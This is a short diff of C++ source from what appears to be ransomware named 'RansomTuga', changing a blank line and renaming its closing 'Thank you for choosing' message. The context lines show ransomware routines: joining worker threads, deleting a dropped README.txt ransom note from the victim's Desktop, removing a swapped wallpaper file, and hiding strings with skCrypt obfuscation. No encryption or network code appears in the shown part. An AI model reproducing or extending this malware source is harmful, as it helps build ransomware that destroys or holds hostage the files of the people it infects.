@@ -74,7 +74,6 @@ int main(int argc, char* argv[])
         threads[i].join();
 
 
-
     if (DROP_README)
         remove(((string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\Desktop\\README.txt")).c_str());
 
@@ -83,7 +82,7 @@ int main(int argc, char* argv[])
         remove((NEWWALLPAPER).c_str());
     }
 
-    cout << skCrypt("Thank you for choosing us!\n\n");
+    cout << skCrypt("Thank you for choosing RansomTuga!\n\n");
     system(skCrypt("pause"));
 
     if (!DEBUG && argc > 0)
